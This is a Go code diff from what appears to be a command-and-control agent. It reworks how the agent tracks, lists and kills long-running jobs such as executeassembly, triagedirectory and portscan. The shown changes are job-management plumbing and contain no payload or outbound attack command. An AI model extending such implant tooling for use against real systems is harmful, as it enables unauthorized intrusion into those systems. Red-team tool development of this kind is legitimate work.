@@ -125,8 +125,21 @@ func main() {
 			// Get the next task
 			t := profile.GetTasking()
 			task := t.(structs.Task)
-			if tasktypes[task.Command] != EXIT_CODE && tasktypes[task.Command] != NONE_CODE {
-				task.JobKillChan = make(chan int)
+			/*
+				Unfortunately, due to the architecture of goroutines, there is no easy way to kill threads.
+				This check is to make sure we're running a "killable" process, and if so, add it to the queue.
+				The supported processes are:
+					- executeassembly
+					- triagedirectory
+					- portscan
+			*/
+			if tasktypes[task.Command] == 16 || tasktypes[task.Command] == 18 || tasktypes[task.Command] == 20 {
+				job := &structs.Job{
+					KillChannel: make(chan int),
+					Stop:        new(int),
+					Monitoring:  false,
+				}
+				task.Job = job
 				taskSlice = append(taskSlice, task)
 			}
 			switch tasktypes[task.Command] {
@@ -297,32 +310,34 @@ func main() {
 				// Return the list of jobs.
 				tMsg := structs.ThreadMsg{}
 				tMsg.TaskItem = task
+				tMsg.Error = false
 				log.Println("Number of tasks processing:", len(taskSlice))
 				fmt.Println(taskSlice)
-				var jobList []structs.TaskStub
-				for _, x := range taskSlice {
-					j := structs.TaskStub{
-						Command: x.Command,
-						ID:      x.ID,
-						Params:  x.Params,
+				// For graceful error handling server-side when zero jobs are processing.
+				if len(taskSlice) == 0 {
+					tMsg.TaskResult = []byte("[]")
+				} else {
+					var jobList []structs.TaskStub
+					for _, x := range taskSlice {
+						jobList = append(jobList, x.ToStub())
 					}
-					jobList = append(jobList, j)
+					jsonSlices, err := json.Marshal(jobList)
+					log.Println("Finished marshalling tasks into:", string(jsonSlices))
+					if err != nil {
+						log.Println("Failed to marshal :'(")
+						log.Println(err.Error())
+						tMsg.Error = true
+						tMsg.TaskResult = []byte(err.Error())
+						go func() {
+							res <- tMsg
+						}()
+						break
+					}
+					tMsg.TaskResult = jsonSlices
 				}
-				jsonSlices, err := json.Marshal(jobList)
-				tMsg.Error = false
-				log.Println("Finished marshalling tasks into:", string(jsonSlices))
-				if err != nil {
-					log.Println("Failed to marshal :'(")
-					log.Println(err.Error())
-					tMsg.Error = true
-					tMsg.TaskResult = []byte(err.Error())
+				go func() {
 					res <- tMsg
-					break
-				}
-				tMsg.TaskResult = jsonSlices
-				go func(threadChan *chan structs.ThreadMsg, msg *structs.ThreadMsg) {
-					*threadChan <- *msg
-				}(&res, &tMsg)
+				}()
 				log.Println("returned!")
 				break
 			case 22:
@@ -334,11 +349,7 @@ func main() {
 				foundTask := false
 				for _, taskItem := range taskSlice {
 					if taskItem.ID == task.Params {
-						go func(jobChan chan<- int) {
-							log.Println(fmt.Sprintf("Sending kill message to channel 0x%08d", jobChan))
-							jobChan <- 1
-							log.Println("Sent kill message")
-						}(taskItem.JobKillChan)
+						go taskItem.Job.SendKill()
 						foundTask = true
 					}
 				}
